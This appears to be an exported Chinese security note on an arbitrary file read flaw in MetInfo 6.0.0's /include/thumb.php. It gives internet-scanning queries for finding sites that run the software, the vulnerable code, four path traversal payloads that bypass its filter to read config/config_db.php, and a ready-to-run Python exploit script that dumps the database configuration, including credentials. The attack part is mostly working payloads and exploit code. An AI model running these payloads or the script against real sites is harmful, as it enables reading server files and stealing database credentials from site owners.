class="highlight-default">文件存在任意文件读取漏洞，攻击者可利用</mark>该漏洞读取网站的敏感文件。</p><p id="b1296d0b-7d20-4003-9de3-3a6c0cf21ec1" class="">【条件&amp;影响】</p><p id="9affc225-6bb5-4d82-8079-9131f68ecc88" class="">影响版本：<div class="indented"><p id="fbf9b89d-2fcf-4de1-b794-a6408a9591e0" class="">Metinfo6.0.0</p></div></p><p id="a0a7d29d-3b1b-4a45-b3db-02ad6dfef3c6" class="">测绘：<div class="indented"><p id="f53eff7f-3f93-41c2-b08e-709631559799" class="">FOFA——app=&quot;metinfo&quot;</p><p id="78c85837-6899-4606-9897-d804da1645c4" class="">ZoomEye——app:&quot;MetInfo&quot;或者app:&quot;MetInfo&quot;+os:&quot;Windows&quot;</p></div></p><p id="34fe364f-f3e7-4f73-9f91-0a1e0de0c21d" class="">【原理】</p><p id="05fdf111-1c46-4fab-a875-e71df3e3d24f" class="">源码如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8ab0d644-f7d6-4470-b699-49a714a0da44" class="code"><code class="language-Plain Text">defined(&#x27;IN_MET&#x27;) or exit(&#x27;No permission&#x27;);
+load::sys_class(&#x27;web&#x27;);
+class old_thumb extends web{
+      public function doshow(){
+        global $_M;
+        $dir = str_replace(array(&#x27;../&#x27;,&#x27;./&#x27;), &#x27;&#x27;, $_GET[&#x27;dir&#x27;]);
+        if(substr(str_replace($_M[&#x27;url&#x27;][&#x27;site&#x27;], &#x27;&#x27;, $dir),0,4) == &#x27;http&#x27; &amp;&amp; strpos($dir, &#x27;./&#x27;) === false){
+            header(&quot;Content-type: image/jpeg&quot;);
+            ob_start();
+            readfile($dir);
+            ob_flush();
+            flush();
+            die;
+        }</code></pre><p id="47ad387f-a8e7-469e-a2d6-4a922d1732a6" class="">逆天逻辑，居然是<mark class="highlight-default">将</mark><mark class="highlight-default"><code>../</code></mark><mark class="highlight-default">，</mark><mark class="highlight-default"><code>./</code></mark>替换成空值。直接双写绕过！</p><p id="53838de7-5312-4c56-85ff-f1c8ccc3cfce" class="">【poc&amp;利用方式】</p><p id="448fe969-96cf-4e98-84b2-cb9c2e105b5d" class="">url在/include/thumb.php这里，可以携带传参如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d3798b25-026c-4a04-913c-5d8e9c379649" class="code"><code class="language-Plain Text">测试一：
+/include/thumb.php?dir=..././http/..././config/config_db.php
+
+测试二：
+/include/thumb.php?dir=.....///http/.....///config/config_db.php
+
+测试三：
+/include/thumb.php?dir=http/.....///.....///config/config_db.php
+
+测试四：
+/include/thumb.php?dir=http\..\..\config\config_db.php
+注意，此第四条POC 仅适用于Windows 系统，Linux 下无效，因为只有windows以右斜杠作为文件路径分隔符</code></pre><p id="06783d55-3532-4d76-9d30-b5a02556ffcf" class="">深度利用下，可以读数据库账号密码</p><ul id="5c88412b-39e4-4f17-98c7-46b5d752704a" class="toggle"><li><details open=""><summary>深度利用脚本如下</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2193b65f-1b4c-4cb1-9a5d-b05d3bb49718" class="code"><code class="language-Plain Text">import requests
+import sys
+
+banner = &quot;&quot;&quot;
+MetInfo 6.0.0
+    ___________.__.__           __________                   .___
+    \_   _____/|__|  |   ____   \______   \ ____ _____     __| _/
+    |    __)  |  |  | _/ __ \   |       _// __ \\__  \   / __ | 
+    |     \   |  |  |_\  ___/   |    |   \  ___/ / __ \_/ /_/ | 
+    \___  /   |__|____/\___  &gt;  |____|_  /\___  &gt;____  /\____ | 
+        \/                 \/          \/     \/     \/      \/ 
+     
+Usage: python3 *.py http://192.168.80.139/MetInfo6.0.0/
+&quot;&quot;&quot;
+
+headers = {
+    &quot;User-Agent&quot;:   &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36&quot;
+}
+
+dir_list = [
+    &quot;..././http/..././config/config_db.php&quot;,
+    &quot;.....///http/.....///config/config_db.php&quot;,
+    &quot;http/.....///.....///config/config_db.php&quot;,
+    &quot;http\..\..\config\config_db.php&quot;
+]
+
+def attack(host):
+    vul = &quot;/include/thumb.php&quot;
+    url = host + vul
+
+    res = requests.get(url = url, headers = headers)
+
+    if res.status_code != 200:
+        print(f&quot;[INFO] {vul} is Not Exists!&quot;)
+        exit()
+
+    print(f&quot;[INFO] {vul} is Exists!&quot;)
+
+    for param in dir_list:
+        params = {
+            &quot;dir&quot;:  param 
+        }
+
+        res = requests.get(url = url, params = params, headers = headers)
+
+        print(f&quot;[INFO] Test URL: {res.url}&quot;)
+
+        if &quot;&lt;?php&quot; in res.text:
+            print(&quot;[RESULT] The target is vulnreable!&quot;)
+            print(f&quot;[RESULT]\n{res.text}&quot;)
+            break
+
+if len(sys.argv) &lt; 2:
+    print(banner)
+    exit()
+
+host = sys.argv[1]
+
+attack(host = host)
+</code></pre></details></li></ul><p id="3781c02a-63bd-40d0-96f0-9da2576dbc13" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
